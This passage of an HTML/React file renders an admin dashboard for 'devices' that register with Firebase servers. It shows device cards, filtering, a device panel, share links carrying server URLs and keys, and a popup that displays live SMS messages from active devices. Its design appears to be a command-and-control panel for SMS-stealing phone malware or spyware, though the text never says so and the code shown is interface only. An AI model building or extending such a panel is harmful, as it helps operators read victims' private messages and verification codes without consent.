                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 2xl:grid-cols-5 gap-4">
                  {Array.from({ length: 6 }).map((_, i) => (
                    <div key={i} className="bg-[#111111] border border-[#1f1f1f] rounded-2xl p-4 animate-pulse">
                      <div className="flex items-start gap-3 mb-3">
                        <div className="w-10 h-10 rounded-xl bg-[#1a1a1a]" />
                        <div className="flex-1 space-y-2"><div className="h-3 bg-[#1a1a1a] rounded w-3/4" /><div className="h-2 bg-[#151515] rounded w-1/2" /></div>
                      </div>
                      <div className="grid grid-cols-2 gap-3 mb-3"><div className="h-8 bg-[#151515] rounded-xl" /><div className="h-8 bg-[#151515] rounded-xl" /></div>
                      <div className="h-10 bg-[#131313] rounded-xl" />
                    </div>
                  ))}
                </div>
              </div>
            ) : devices.length === 0 && Object.keys(serverErrors).length === 0 ? (
              <div className="flex flex-col items-center justify-center py-24 text-center">
                <div className="w-16 h-16 rounded-2xl bg-[#111] border border-[#1e1e1e] flex items-center justify-center mb-5">
                  <Icon name="Shield" className="w-8 h-8 text-[#2a2a2a]" />
                </div>
                <p className="text-base font-bold text-[#444]">No devices connected</p>
                <p className="text-sm text-[#333] mt-1.5 mb-5">Waiting for devices to register…</p>
                <div className="flex items-center gap-2 px-4 py-2 rounded-full bg-[#111] border border-[#1e1e1e]">
                  <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
                  <span className="text-xs text-[#555]">Auto-refreshing every 15s</span>
                </div>
              </div>
            ) : (
              <div>
                {filtered.length === 0 && devices.length > 0 ? (
                  <div className="flex flex-col items-center justify-center py-20 text-center">
                    <Icon name="Search" className="w-10 h-10 text-[#2a2a2a] mb-3" />
                    <p className="text-sm font-medium text-[#444]">No devices match your filter</p>
                    <button onClick={() => { setFilter('all'); setSearch(''); }} className="mt-3 text-xs text-red-400 hover:text-red-300 transition-colors">Clear filters</button>
                  </div>
                ) : (
                  <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 2xl:grid-cols-5 gap-4">
                    {filtered.map(d => (
                      <DeviceCard key={`${d.serverId}_${d.id}`} device={d}
                        serverColor={servers.length > 1 ? SERVER_COLORS_MAP[d.serverId ?? 0] : undefined}
                        onClick={() => setSelectedDevice(d)} />
                    ))}
                  </div>
                )}
              </div>
            )}
          </main>

          {/* Device panel */}
          {selectedDevice && selectedServer && (
            <DevicePanel device={selectedDevice} fbUrl={selectedServer.url} fbKey={selectedServer.key}
              onClose={() => setSelectedDevice(null)} onDelete={() => { setSelectedDevice(null); loadAllDevices(false); }} showToast={showToast} />
          )}

          {/* Live SMS Popup for active devices — tap to open device */}
          <SmsLivePopup
            msg={popupMsg}
            onDismiss={() => { if (popupTimerRef.current) clearTimeout(popupTimerRef.current); advancePopup.current(); }}
            onOpen={() => {
              if (popupMsg?.device) {
                setSelectedDevice(popupMsg.device);
                if (popupTimerRef.current) clearTimeout(popupTimerRef.current);
                advancePopup.current();
              }
            }}
          />

          {/* Toasts */}
          {toasts.length > 0 && (
            <div className="fixed bottom-6 left-1/2 -translate-x-1/2 z-[100] flex flex-col gap-2 items-center pointer-events-none">
              {toasts.map(t => (
                <div key={t.id} className="flex items-center gap-2 px-4 py-2.5 bg-[#1a1a1a] border border-[#2a2a2a] rounded-full shadow-xl shadow-black/60 text-sm text-white animate-fade-up">
                  <Icon name="CheckCircle" className="w-4 h-4 text-emerald-400 flex-shrink-0" />
                  {t.text}
                </div>
              ))}
            </div>
          )}
        </div>
      );
    }

    // ─── App ──────────────────────────────────────────────────────────────────────
    function App() {
      const [state, setState] = useState(() => isAdminLoggedIn() ? 'connect' : 'login');
      const [activeServers, setActiveServers] = useState([]);

      useEffect(() => {
        const params = new URLSearchParams(window.location.search);
        const sParam = params.get('s');
        if (sParam) {
          const parsed = parseShareLink(sParam);
          if (parsed && isAdminLoggedIn()) {
            const accounts = getAccounts();
            const existing = accounts.find(a => a.url === parsed.url);
            const server = existing || { id: Date.now(), name: 'Shared Server', url: parsed.url, key: parsed.key, date: new Date().toLocaleString(), color: '#ef4444' };
            setActiveServers([server]); setState('dashboard');
            window.history.replaceState(null, '', window.location.pathname);
            return;
          }
        }
        const msParam = params.get('ms');
        if (msParam) {
          const parsed = parseMultiShareLink(msParam);
          if (parsed && isAdminLoggedIn()) {
            const colors = ['#ef4444','#f97316','#eab308','#22c55e','#06b6d4','#3b82f6','#a855f7','#ec4899'];
            const servers = parsed.map((s, i) => ({ id: Date.now() + i, name: s.name || `Firebase Server ${i+1}`, url: s.url, key: s.key, date: new Date().toLocaleString(), color: colors[i % colors.length] }));
            setActiveServers(servers); setState('dashboard');
            window.history.replaceState(null, '', window.location.pathname);
            return;
          }
        }
        if (isAdminLoggedIn()) {
          const ids = getActiveServerIds();
          const accounts = getAccounts();
          if (ids.length > 0) {
            const prev = accounts.filter(a => ids.includes(a.id));
            if (prev.length > 0) { setActiveServers(prev); setState('dashboard'); }
          }
        }
      }, []);

      return (
        <div className="min-h-screen bg-[#080808]">
          {state === 'login' && <AdminLogin onLogin={() => setState('connect')} />}
          {state === 'connect' && <ConnectScreen onConnect={servers => { setActiveServers(servers); setState('dashboard'); }} />}
          {state === 'dashboard' && activeServers.length > 0 && (
            <Dashboard servers={activeServers}
              onLogout={() => { adminLogout(); setActiveServers([]); setState('login'); }}
              onBackToConnect={() => setState('connect')} />
          )}
        </div>
      );
    }

    const root = ReactDOM.createRoot(document.getElementById('app'));
    root.render(<App />);
  </script>
</body>
</html>
